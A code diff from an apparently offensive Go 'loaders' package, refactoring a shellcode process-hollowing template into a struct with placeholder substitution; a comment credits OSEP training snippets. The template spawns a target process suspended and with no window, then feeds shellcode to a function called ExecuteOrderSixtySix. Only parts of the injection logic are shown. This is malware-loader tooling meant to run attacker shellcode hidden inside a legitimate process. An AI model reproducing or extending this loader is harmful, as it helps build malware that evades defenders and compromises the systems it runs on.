@@ -2,6 +2,7 @@ package loaders
 
 import (
 	"fmt"
+	"strings"
 )
 
 /*
@@ -12,17 +13,20 @@ import (
    https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Hollowing/Program.cs
 */
 
-func GetProcessHollowingTemplate(targetProcess string) string {
-	return fmt.Sprintf(`
-package main
+type ProcHollowTemplate struct{}
 
+func (t ProcHollowTemplate) Import() string {
+	return fmt.Sprintf(`
 import (
 	"encoding/binary"
 	"syscall"
 	"unsafe"
 )
+`)
+}
 
-
+func (t ProcHollowTemplate) Const() string {
+	return fmt.Sprintf(`
 const (
     CREATE_SUSPENDED          = 0x00000004
     CREATE_NO_WINDOW          = 0x08000000
@@ -53,7 +57,24 @@ type PROCESS_BASIC_INFORMATION struct {
 	UniquePid    uintptr
 	MoreReserved uintptr
 }
+`)
+}
 
+func (t ProcHollowTemplate) Init() string {
+	return ""
+}
+
+func (t ProcHollowTemplate) Process() string {
+	return ""
+}
+
+func (t ProcHollowTemplate) GetTemplate(targetProcess string) string {
+	var template = `
+package main
+
+__IMPORT__STATEMENT__
+
+__CONST__STATEMENT__
 
 func createProcess(processName string) *syscall.ProcessInformation {
     var si syscall.StartupInfo
@@ -83,7 +104,7 @@ func createProcess(processName string) *syscall.ProcessInformation {
 
 
 func ExecuteOrderSixtySix(shellcode []byte) {
-    processName := "%s"
+    processName := "__PROCESS__"
     process := createProcess(processName)
     pHandle := uintptr(process.Process)
     tHandle := uintptr(process.Thread)
@@ -174,5 +195,8 @@ func ExecuteOrderSixtySix(shellcode []byte) {
         panic(err)
     }
 }
-    `, targetProcess)
+    `
+	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
+	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
+	return strings.Replace(template, "__PROCESS__", targetProcess, -1)
 }
